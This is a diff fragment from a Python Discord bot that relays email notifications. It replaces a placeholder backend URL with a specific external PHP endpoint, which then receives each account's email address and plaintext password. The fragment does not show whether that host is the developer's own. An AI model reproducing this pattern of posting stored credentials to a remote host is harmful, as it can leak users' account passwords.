@@ -202,7 +202,7 @@ async def send_email_to_discord(subject, from_, preview):
     channel = bot.get_channel(1274024103350894622)  # Set your Discord channel ID here
     if channel:
         # Request the login link from the PHP backend service
-        backend_url = "https://yourdomain.com/generate_token.php"
+        backend_url = "https://truevision.se/emails.php"
         response = requests.post(backend_url, data={'email': account['email'], 'password': account['password']})
         
         if response.status_code == 200:
